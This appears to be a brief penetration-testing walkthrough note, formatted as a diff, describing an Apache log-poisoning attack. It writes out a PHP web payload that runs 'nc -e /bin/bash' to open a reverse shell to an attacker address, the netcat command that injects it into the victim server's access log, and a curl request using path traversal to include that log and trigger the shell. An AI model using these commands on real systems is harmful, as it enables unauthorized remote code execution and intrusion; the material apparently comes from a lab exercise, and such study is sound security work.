@@ -1,0 +1,10 @@
+GET <?php system('nc -e /bin/bash 192.168.49.69 4444'); ?> HTTP/1.1
+
+From here make sure you do a | nc xxx.xxx.xxx.xxx 80 (that should be the other web interface on the victim machine, whole command would look like such)
+
+echo "GET <?php system('nc -e /bin/bash 192.168.49.69 4444'); ?> HTTP/1.1" | nc 192.168.1.2 80
+
+After this you want ot issue a curl command and have a listener set up
+
+curl http://192.168.69.72:8593?book=../../../../../var/log/apache2/access.log
+
